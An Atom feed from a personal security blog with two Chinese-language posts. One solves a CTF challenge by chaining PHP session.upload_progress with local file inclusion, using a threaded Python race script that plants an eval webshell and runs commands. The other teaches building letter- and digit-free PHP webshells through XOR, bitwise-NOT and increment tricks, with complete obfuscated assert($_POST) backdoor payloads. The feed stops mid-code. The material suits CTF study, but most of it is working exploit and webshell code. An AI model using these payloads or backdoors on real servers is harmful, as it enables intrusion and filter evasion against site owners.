<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ca01h&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ca0y1h.top/"/>
  <updated>2020-10-19T02:35:44.550Z</updated>
  <id>http://ca0y1h.top/</id>
  
  <author>
    <name>ca01h</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>session.upload_progress+LFI实现RCE</title>
    <link href="http://ca0y1h.top/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE/"/>
    <id>http://ca0y1h.top/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE/</id>
    <published>2020-10-19T02:34:25.000Z</published>
    <updated>2020-10-19T02:35:44.550Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-session-upload-process-LFI实现RCE">PHP session.upload_process + LFI实现RCE</h1><blockquote><p>参考文章：</p><p><a href="https://tgaout.github.io/2019/05/29/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B8%97%E9%80%8F/">https://tgaout.github.io/2019/05/29/利用session-upload-progress进行文件包含和反序列化渗透/</a></p></blockquote><p>这篇文章主要记录参考文章的复现环节，知识点部分简单介绍。</p><h2 id="0x01-PHP关于upload-process配置介绍">0x01 PHP关于upload_process配置介绍</h2><p>本文提到的PHP配置中关于session.upload_process主要是下面四个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled &#x3D; on</span><br><span class="line">session.upload_progress.cleanup &#x3D; on</span><br><span class="line">session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure><ul><li><p><code>enabled=on</code>表示当浏览器向服务器上传文件的时候，PHP会把本次文件上传的详细信息存储在session中；</p></li><li><p><code>cleanup=on</code>表示上传结束后，PHP会立即清空对应的session文件中的内容；</p></li><li><p>关于<code>prefix</code>和<code>name</code>两个选项，PHP文档中有详细说明：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018095115.png" alt=""></p></li></ul><h2 id="0x02-upload-progress-文件包含实现RCE">0x02 upload_progress + 文件包含实现RCE</h2><h3 id="示例代码">示例代码</h3><p>直接从一道CTF题目入手：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:20:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">define(<span class="string">&#x27;还要秀？&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(还要秀？);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ban掉了常见的文件包含伪协议，这个时候我们可以利用<code>session.upload_progress</code>将恶意代码写入session文件，从而包含session文件。</p><p>现在还存在两个问题：首先没有代码中没有<code>session_start()</code>如何创建session文件；第二个问题，由于<code>session.upload_progress.cleanup=on</code>，当文件上传结束后，session文件的内容被自动清除，如何进行RCE？</p><h3 id="session-use-strict-mode">session.use_strict_mode</h3><p>关于第一个问题，session还有一个默认配置：<code>session.use_strict_mode=0</code>，意思就是用户可以自定义Session ID。具体而言，我们在Cookie中设置<code>Cookie:PHPSESSID=ca01h</code>，PHP将会在服务器上session存储的位置创建一个文件<code>session_ca01h</code>，即使用户没有初始化Session，PHP也会自动初始化Session，并且产生一个键值，这个键值由<code>session.upload_progress.prefix</code>+<code>session.upload_progress_name</code>组成，最后被写入sess_文件中。</p><h3 id="条件竞争">条件竞争</h3><p>为了赶在session文件被清除之前进行RCE，可以通过上传一个大文件进行条件竞争。</p><h3 id="解题">解题</h3><p>本来是想直接写一个脚本Getshell的，结果一直没能调试出来，只能用burp抓包intrude了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://7a4916f9-18d7-4ecf-bed3-302ed44c5763.chall.ctf.show/index.php&quot;&quot;&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;ca01h&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;</span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">        resp = session.post(url=url, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php eval($_POST);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;ca01h.txt&quot;</span>, f)&#125;, cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: sessid&#125;, proxies=proxy)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url=url+<span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid, data=data, proxies=proxy)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ca01h.txt&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[++++++]Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure><p>burp抓包</p><p>文件上传请求包：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120147.png" alt=""></p><p>执行命令请求包：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120341.png" alt=""></p><p>条件竞争爆破</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120536.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP-session-upload-process-LFI实现RCE&quot;&gt;PHP session.upload_process + LFI实现RCE&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;参考文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://tgaout
      
    
    </summary>
    
    
      <category term="web安全" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="基础学习" scheme="http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="PHP" scheme="http://ca0y1h.top/tags/PHP/"/>
    
      <category term="web安全学习" scheme="http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>PHP无数字字母构造webshell</title>
    <link href="http://ca0y1h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/"/>
    <id>http://ca0y1h.top/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/</id>
    <published>2020-10-19T02:30:23.000Z</published>
    <updated>2020-10-19T02:31:55.563Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP无数字字母构造webshell">PHP无数字字母构造webshell</h1><h2 id="0x01-从一道题目出发">0x01 从一道题目出发</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析代码可知</p><ul><li>只要执行getFlag()函数应该就可以得到flag了</li><li>但对code的长度限制&lt;40，并且code不能有数字和大小写字母</li></ul><h2 id="0x02-前置知识">0x02 前置知识</h2><h3 id="异或运算">异或运算</h3><p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。</p><p>举个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A的ASCII值是65，对应的二进制值是01000001</span><br><span class="line">&#96;?的ASCII值是63，对应的二进制值是00111111</span><br></pre></td></tr></table></figure><p>异或的二进制的值是<code>01111110</code>，对应的ASCII值是126，对应的字符串的值就是<code>~</code>了。</p><p>再结合PHP弱类型的特点，可以将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function B()&#123;</span><br><span class="line">        echo &quot;Hello Angel_Kitty&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;;</span><br><span class="line">    $__();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>第5行代码对变量名为<code>_</code>的变量进行自增操作，在PHP中未定义的变量默认值为null（nullfalse0），我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。</p><p>第6行代码对字符<code>?</code>和<code>&#125;</code>进行异或操作，得到字符<code>B</code>赋值给变量名为<code>__</code>的变量。</p><p>第7行代码可以看作是执行<code>B()</code>，表示调用函数B,所以执行结果为<code>Hello Angel_Kitty</code>。</p><p>再看一个非数字字母的PHP后门：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; demo1.php</span><br><span class="line">&lt;?php</span><br><span class="line">    @$_++; &#x2F;&#x2F; $_ &#x3D; 1</span><br><span class="line">    $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _</span><br><span class="line">    $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P</span><br><span class="line">    $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO</span><br><span class="line">    $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS</span><br><span class="line">    $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510130021.png" alt=""></p><p><code>_POST</code>的拼接可以将上面的代码合并为一行，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__&#x3D;(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;&#x2F;&quot;^&quot;&#96;&quot;).(&quot;|&quot;^&quot;&#x2F;&quot;).(&quot;&#123;&quot;^&quot;&#x2F;&quot;);</span><br></pre></td></tr></table></figure><p>还可以用更短的字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot; &#x2F;&#x2F;_GET</span><br><span class="line">&quot;#.&#x2F;|&#123;&quot;^&quot;|~&#96;&#x2F;&#x2F;&quot; &#x2F;&#x2F;_POST</span><br></pre></td></tr></table></figure><h3 id="取反运算">取反运算</h3><p>来看一个汉字&quot;和&quot;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;和&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure><p><code>和</code>的第三个字节的值为140[0x8c]，取反的值为-141。<br>负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为<code>0xff73</code>，php中<code>chr(0xff73)</code>==115，115就是s的ASCII值。<br>因此</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;&quot;和&quot;;</span><br><span class="line">print(~($_&#123;2&#125;));</span><br><span class="line">print(~&quot;\x8c&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>两个写法性质一样，结果会输出：<code>ss</code></p><p>脚本生成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; def get(shell):</span><br><span class="line">...     hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">...     print(hexbit)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; get(&#39;phpinfo&#39;)</span><br><span class="line">0x8f0x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure><h3 id="不用数字构造数字">不用数字构造数字</h3><p>主要思想就是，利用了PHP弱类型特性，true的值为1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</span><br><span class="line">print($_) &#x2F;&#x2F; 1</span><br><span class="line">print($_&#x2F;$_) &#x2F;&#x2F; 2</span><br></pre></td></tr></table></figure><blockquote><p>字符<code>&gt;</code>的ascii值大于<code>&lt;</code>ascii的值</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_++;</span><br><span class="line">print($_); &#x2F;&#x2F; 1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>php中未定义的变量默认值为null，nullfalse0</p></blockquote><h2 id="0x03-无数字字母构造webshell">0x03 无数字字母构造webshell</h2><p>代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; demo2.php</span><br><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;shell&#39;])) &#123;</span><br><span class="line">  eval($_GET[&#39;shell&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路</p><p>将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符。然后再利用PHP允许动态函数执行的特点，拼接处一个函数名，如&quot;assert&quot;，然后动态执行即可。</p><blockquote><p>使用assert的话PHP版本必须小于等于7.0</p></blockquote><h3 id="利用异或操作">利用异或操作</h3><p>不可打印字符，用url编码表示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(&#39;%01&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%13&#39;^&#39;&#96;&#39;).(&#39;%05&#39;^&#39;&#96;&#39;).(&#39;%12&#39;^&#39;&#96;&#39;).(&#39;%14&#39;^&#39;&#96;&#39;); &#x2F;&#x2F; $_&#x3D;&#39;assert&#39;;</span><br><span class="line">$__&#x3D;&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;&#96;&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); &#x2F;&#x2F; $__&#x3D;&#39;_POST&#39;;</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]); &#x2F;&#x2F; assert($_POST[_]);</span><br></pre></td></tr></table></figure><blockquote><p>查ascii码对照表可以发现，0x01 = 1 = SOH; 0x13 = 19 = DC3; 0x05 = 5 = ENQ等等</p></blockquote><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510200554.png" alt="img"></p><p>如果要直接使用的话，必须对这些不可打印的特殊字符url编码，实际上木马应该是下面这个样子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;(urldecode(&#39;%01&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%13&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%05&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%12&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%14&#39;)^&#39;&#96;&#39;);</span><br><span class="line">$__&#x3D;&#39;_&#39;.(urldecode(&#39;%0D&#39;)^&#39;]&#39;).(urldecode(&#39;%2F&#39;)^&#39;&#96;&#39;).(urldecode(&#39;%0E&#39;)^&#39;]&#39;).(urldecode(&#39;%09&#39;)^&#39;]&#39;);</span><br><span class="line">$___&#x3D;$$__;</span><br><span class="line">$_($___[_]);&#x2F;&#x2F; assert($_POST[_]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510200142.png" alt="img"></p><h3 id="利用取反操作">利用取反操作</h3><p>利用的是UTF-8编码的某个汉字，将其中的某个字符取出来，取反为字母。一个汉字的utf8是三个字节，{2}表示第3个字节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__&#x3D;2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_&#x3D;1</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;</span><br><span class="line">$____&#x3D;&quot;和&quot;;</span><br><span class="line">print(~($___&#123;$_&#125;)); &#x2F;&#x2F; a</span><br><span class="line">print(~($____&#123;$__&#125;)); &#x2F;&#x2F; s</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);&#x2F;&#x2F;$__2</span><br><span class="line">$_&#x3D;$__&#x2F;$__;&#x2F;&#x2F;$_1</span><br><span class="line"></span><br><span class="line">$____&#x3D;&#39;&#39;;</span><br><span class="line">$___&#x3D;&quot;瞰&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;和&quot;;$____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;的&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;半&quot;;$____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;始&quot;;$____.&#x3D;~($___&#123;$__&#125;);&#x2F;&#x2F;$____&#x3D;assert</span><br><span class="line"></span><br><span class="line">$_____&#x3D;&#39;_&#39;;$___&#x3D;&quot;俯&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;瞰&quot;;$_____.&#x3D;~($___&#123;$__&#125;);$___&#x3D;&quot;次&quot;;$_____.&#x3D;~($___&#123;$_&#125;);$___&#x3D;&quot;站&quot;;$_____.&#x3D;~($___&#123;$_&#125;);&#x2F;&#x2F;$_____&#x3D;_POST</span><br><span class="line"></span><br><span class="line">$_&#x3D;$$_____;&#x2F;&#x2F;$_&#x3D;$_POST</span><br><span class="line">$____($_[$__]);&#x2F;&#x2F;assert($_POST[2])</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510205730.png" alt="img"></p><p>这里也有一种简短的写法<code>$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;</code>它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。</p><h3 id="利用递增操作符">利用递增操作符</h3><p>我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。<br>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array。再取这个字符串的第一个字母，就可以获得’A’。</p><blockquote><p>因为PHP函数是大小写不敏感的，最终执行的是ASSERT($POST[])，无需获取小写a。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;[];</span><br><span class="line">$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;</span><br><span class="line">$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];</span><br><span class="line">$___&#x3D;$_; &#x2F;&#x2F; A</span><br><span class="line">$__&#x3D;$_;</span><br><span 